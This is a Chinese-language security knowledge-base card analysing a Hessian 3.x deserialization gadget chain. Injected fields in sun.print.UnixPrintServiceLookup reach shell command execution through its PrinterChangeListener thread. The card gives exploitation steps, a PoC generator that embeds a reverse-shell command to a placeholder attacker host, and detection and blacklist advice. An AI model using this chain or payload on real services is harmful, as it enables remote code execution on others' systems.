---
id: web-java-deser-hessian-javadeserializer-constructor-unixprintservicelookup-rce
title: Hessian 3.x JavaDeserializer 调构造器 + 反射赋值：非 Serializable 的 sun.print.UnixPrintServiceLookup 经 PrinterChangeListener 线程执行 lpcAllCom 命令（4.x Unsafe allocateInstance 不触发）
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian3-nonserializable-constructor-unixprintservicelookup-poller-rce
tags:
- java
- hessian
- deserialization
- non-serializable
- constructor
- javadeserializer
- unsafedeserializer
- unixprintservicelookup
- printerchangelistener
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V685
  verified_at: '2026-11-13T14:49:53+08:00'
  notes: 已对照原文全文与24张截图核对：图01 UnixPrintServiceLookup 字段（pollServices=true、minRefreshTime=120）；图02 构造器 new PrinterChangeListener().start()；图03 run() 循环 refreshServices+sleep(minRefreshTime*1000)；图04 getAllPrinterNamesBSD 的 execCmd(this.lpcAllCom[cmdIndex])；图05 execCmd 用 /bin/sh -c LC_ALL=C+var0（SysV/AIX 走 /usr/bin/sh env）并 Runtime.exec；图06 类未实现 Serializable；图07 协议表 Hessian 3.x/Hessian Lite≤3.2.12/SOFA<4.0.0/Kryo/Fastjson/Jackson 支持；图08-18 Hessian 3.1.5 Hessian2Input→readObjectDefinition→SerializerFactory.readObject→JavaDeserializer.readObject→instantiate()（_constructor.newInstance/_type.newInstance）→Field.set 反射赋值（以 TemplatesImpl 字段 map 为例）；图19 3.x getDefaultSerializer 的 !Serializable&&!_isAllowNonSerializable 抛异常分支；图20 4.x getDefaultSerializer（_isEnableUnsafeSerializer && writeReplace==null→UnsafeSerializer）；图21-22 UnsafeDeserializer allocateInstance/putObject；图23 hessian-lite DENY_CLASS；图24 SOFA security/serialize.blacklist。修正两处：execCmd 临时文件重定向行按图改为 var3.getAbsolutePath() 且无空格；步骤4『首次刷新』改为字段注入后的下一次轮询（构造时先
    refresh 一次后 sleep 默认120s），已同步 staging 与 knowledge。未验证点：原文无完整 PoC/命令执行结果，链按源码成立，confidence=medium 合理；JDK9+ 模块封装限制原文未讨论。dedup：Gson 卡用 PrintServiceLookupProvider（JDK11+）不同类/协议、Cayenne 卡走 getDefaultPrintService、JNDI 卡走 UnixPrintService.printer，均非同链。
url: /docs/web/java/deserialization/hessian/web-java-deser-hessian-javadeserializer-constructor-unixprintservicelookup-rce/
draft: false
kb_aliases:
- Magic In Java API
- UnixPrintServiceLookup 反序列化
- Hessian 3.x JavaDeserializer
- Hessian 4.x UnsafeDeserializer
- PrinterChangeListener 命令执行
- lpcAllCom 命令注入
- 非 Serializable 类反序列化
- setAllowNonSerializable
---

## 一句话结论

Hessian 3.x 的 `JavaDeserializer` 在允许非 Serializable 类（`_isAllowNonSerializable=true`）时，会对 `sun.print.UnixPrintServiceLookup` 这类**未实现 `Serializable`** 的类执行 `instantiate()` 调用其构造器，再用反射 `Field.set()` 恢复字段；`UnixPrintServiceLookup` 的构造器会启动 `PrinterChangeListener` 守护线程，线程循环进入 `getAllPrinterNamesBSD()` 并执行 `execCmd(this.lpcAllCom[cmdIndex])`，而 `execCmd` 用 `/bin/sh -c "LC_ALL=C " + 参数` 运行——控制 `lpcAllCom` 元素即可命令注入。Hessian 4.x 改为 `UnsafeDeserializer`：`Unsafe.allocateInstance` 不执行构造器、字段用 `Unsafe.putObject` 写入，因此这类“构造器副作用”gadget 在 4.x 下失效。

## 原理

- **sink：`UnixPrintServiceLookup` 的轮询线程**：该类（`sun.print`）的字段包括 `defaultPrinter`、`printServices`、`lpcAllCom` 等；构造器在 `pollServices`（静态默认 true）为真时 `new PrinterChangeListener()`、`setDaemon(true)`、`start()`。`PrinterChangeListener.run()` 是 `while(true)`：`refreshServices()` → 计算刷新间隔 → `sleep(minRefreshTime*1000)`。`refreshServices` 在 BSD/非 SysV 分支调用 `getAllPrinterNamesBSD()`：
  ```java
  if (cmdIndex == -1) { cmdIndex = getBSDCommandIndex(); }
  String[] var1 = execCmd(this.lpcAllCom[cmdIndex]);
  ```
  `execCmd(String var0)`：
  ```java
  if (!isSysV() && !isAIX()) {
      var2 = {"/bin/sh", "-c", "LC_ALL=C " + var0};
  } else {
      var2 = {"/usr/bin/sh", "-c", "env LC_ALL=C " + var0};
  }
  var2[2] = var2[2] + ">" + var3.getAbsolutePath();
  Process p = Runtime.getRuntime().exec(var2);
  ```
  因此 `lpcAllCom[cmdIndex]` 是直接拼进 shell 命令行的字符串，攻击者可控即为命令注入。轮询线程随构造器启动、在后台持续运行，不需要额外方法调用。
- **为什么普通 Java 反序列化不行**：`UnixPrintServiceLookup` 没有实现 `Serializable`，原生 `ObjectInputStream` 无法实例化/还原它，也无法设置其私有字段。
- **Hessian 3.x 为什么行**：反序列化对象时默认走 `SerializerFactory.getDefaultSerializer(cl)`，3.x 的逻辑是——若 `!Serializable.class.isAssignableFrom(cl) && !_isAllowNonSerializable` 才抛 `IllegalStateException`；允许非 Serializable 时返回 `JavaSerializer`。`JavaDeserializer.readObject(in, fieldNames)` 先 `instantiate()`：
  ```java
  return this._constructor != null
      ? this._constructor.newInstance(this._constructorArgs)
      : this._type.newInstance();
  ```
  即真正调用构造器；随后逐个字段调用 `FieldDeserializer.deserialize(in, obj)`，3.x 的实现是 `this._field.set(obj, value)` 反射赋值。构造器副作用（启动线程）+ 字段注入（`lpcAllCom`/`cmdIndex`）因此同时成立。
- **Hessian 4.x 为什么不触发**：4.x 的 `getDefaultSerializer` 在允许非 Serializable 且 `_isEnableUnsafeSerializer`、类无 `writeReplace` 时返回 `UnsafeSerializer`，否则退回 `JavaSerializer`；而 `UnsafeDeserializer.instantiate()` 使用 `_unsafe.allocateInstance(_type)` 分配对象，**不调用构造器**，字段恢复用 `_unsafe.putObject(obj, _offset, value)`。构造器不执行，`PrinterChangeListener` 线程不会启动，这条 gadget 失效（字段仍可被写入，但没有触发点）。
- **衍生协议版本**：原文表格标记 Hessian 3.x、Hessian Lite ≤3.2.12、SOFA-Hessian <4.0.0 支持非 Serializable 类；Hessian-lite 内置 `DENY_CLASS`、SOFA-Hessian 内置 `security/serialize.blacklist`，若 `sun.print.*` 在黑名单中则仍被拦截，利用前需核对版本与黑名单。
- **边界与前提**：目标端的 `SerializerFactory` 必须允许非 Serializable 类（如业务框架调用 `setAllowNonSerializable(true)`，否则 3.x 在 `getDefaultSerializer` 直接抛异常）；`sun.print.UnixPrintServiceLookup` 属 JDK 内部类，JDK 9+ 反射写 `sun.print` 私有字段可能受模块封装限制（需 `--add-opens java.desktop/sun.print=ALL-UNNAMED`），原文未讨论该限制，JDK 8 环境最直接。

## 触发条件

- 目标使用 Hessian 3.x（或 Hessian Lite ≤3.2.12、SOFA-Hessian <4.0.0）反序列化外部数据，且 SerializerFactory 允许非 Serializable 类、黑名单未拦截 `sun.print.UnixPrintServiceLookup`。
- 目标运行在 Unix/Linux，`UnixPrintServiceLookup` 可用且走 BSD 分支（`isSysV()`/`isAIX()` 为假）。
- 攻击者能控制反序列化对象的字段 `lpcAllCom`（命令数组）与 `cmdIndex`（指向要执行的元素），并让 `pollServices` 保持 true（默认静态值）。
- JDK 8 或已对 `java.desktop/sun.print` 开放反射的 JDK 9+ 环境更易成立。

## 利用步骤

1. 用 Hessian 3.x 序列化一个 `sun.print.UnixPrintServiceLookup` 对象（生成端同样需 `serializerFactory.setAllowNonSerializable(true)`），字段设置为：
   - `lpcAllCom`：`String[]`，在 `cmdIndex` 指向的位置放 `; <命令> ;` 或完整 shell 片段；
   - `cmdIndex`：合法索引；
   - 其余字段按默认/可空。
2. 将 Hessian 字节发往目标的反序列化入口（RPC 参数、HessianServlet、Dubbo 等）。
3. 目标 `JavaDeserializer.instantiate()` 调用构造器 → `PrinterChangeListener` 守护线程启动 → `refreshServices` → `getAllPrinterNamesBSD` → `execCmd(lpcAllCom[cmdIndex])` → `/bin/sh -c "LC_ALL=C <命令>"` 执行。
4. 字段注入完成后，命令在轮询线程的下一次 `refreshServices` 触发（构造器启动线程时会先刷新一次，随后按 `minRefreshTime` 默认 120s 级别 sleep，故注入的命令通常在后续轮询执行），可用反弹 shell/写文件验证。

## PoC

原文未给出可直接运行的完整 PoC（仅 KCON 议题的源码分析与调试截图），以下为按原文链路构造的 payload 字段示意（未在本机执行）：

```java
// 生成端（Hessian 3.x）
SerializerFactory sf = new SerializerFactory();
sf.setAllowNonSerializable(true);

sun.print.UnixPrintServiceLookup lookup = new sun.print.UnixPrintServiceLookup();
String cmd = "bash -i >& /dev/tcp/attacker/4444 0>&1";
setField(lookup, "lpcAllCom", new String[]{cmd, cmd, cmd});
setField(lookup, "cmdIndex", 0);
// lookup 未实现 Serializable，但 Hessian 3.x 仍会序列化其字段

// Hessian2Output out = new Hessian2Output(socket.getOutputStream());
// out.setSerializerFactory(sf);
// out.writeObject(lookup);
```

调试依据（原文截图）：3.x `JavaDeserializer.instantiate()` 调用 `_type.newInstance()` / `_constructor.newInstance(...)`，字段恢复为 `_field.set(obj, value)`；4.x `UnsafeDeserializer.instantiate()` 为 `_unsafe.allocateInstance(_type)`，字段恢复为 `_unsafe.putObject(...)`。原文用 `TemplatesImpl` 作被反序列化类展示字段 map（`_name`、`_bytecodes`、`_transletIndex` 等）与反射赋值过程。

## 变体与关联

- **同 sink 的其他触发方式**：Cayenne 卡用 `UIDefaults/SwingLazyValue → MethodUtil.invoke → UnixPrintServiceLookup.getDefaultPrintService` 主动调用打印服务方法，配合 `lpcFirstCom/cmdIndex` 执行命令，不依赖构造器与 Hessian 版本；本卡走构造器 + 轮询线程，二者入口不同。
- **同族 `sun.print` gadget**：`sun.print.UnixPrintService` 的 `printer` 字段可经 `POJONode.toString` getter 拼进 `lpc`/`lpstat` 命令（见 `[[web-java-deser-hessian-jndi-reference-only-unixprintservice]]`）。
- **协议替代**：原文表格称 Kryo、Fastjson（FieldBased）、Jackson（FieldBased）也支持非 Serializable 类字段注入；但它们不一定调用构造器，是否触发同类构造器 gadget 需按实现验证。
- **4.x 下的出路**：若目标为 Hessian 4.x，需换不依赖构造器的触发点（字段注入后由其他方法调用/getter 触发），或改用 3.x 行为兼容的协议/版本。
- 关联：`[[web-java-deser-hessian-cayenne-rop-servlet-entry]]`（UnixPrintServiceLookup sink 的完整可用链）、`[[web-java-deser-hessian-dubbo-provider-argument-deserialization-rce]]`（JavaDeserializer 全 null 构造导致 SignedObject NPE 的限制）、`[[hessian-deserialization-serializerfactory-getdeserializer-hook-blacklist]]`（按类名拦截 `sun.print.UnixPrintServiceLookup` 的防御 hook）。

## 检测与防御

- **类名黑名单**：在 Hessian 入口的 `SerializerFactory.getDeserializer(String)` hook 或 JEP 290 filter 中加入 `sun.print.UnixPrintServiceLookup`、`sun.print.UnixPrintService` 等 JDK 内部 gadget 类；Hessian-lite/SOFA-Hessian 需确认其内置黑名单覆盖该类。
- **禁用非 Serializable 反序列化**：不要开启 `setAllowNonSerializable(true)`；升级到 Hessian 4.x 可消除“构造器副作用”型触发，但字段注入仍可能配合其他 sink，必须同时做类白名单。
- **JDK 加固**：JDK 9+ 不对 `java.desktop/sun.print` 做 `--add-opens`，降低反射写私有字段的可行性；使用最新 JDK 的模块封装。
- **检测**：反序列化流中出现 `sun.print.UnixPrintServiceLookup`/`UnixPrintService` 类型；JVM 中出现 `PrinterChangeListener` 线程、`Runtime.exec` 参数含 `LC_ALL=C` 与 `lpc`/异常 shell 片段；异常栈含 `JavaDeserializer.instantiate`/`FieldDeserializer`。
- **响应**：确认 Hessian 入口与版本，抓取请求体做类名解析，排查是否有 `/bin/sh -c "LC_ALL=C ..."` 子进程与轮询线程。
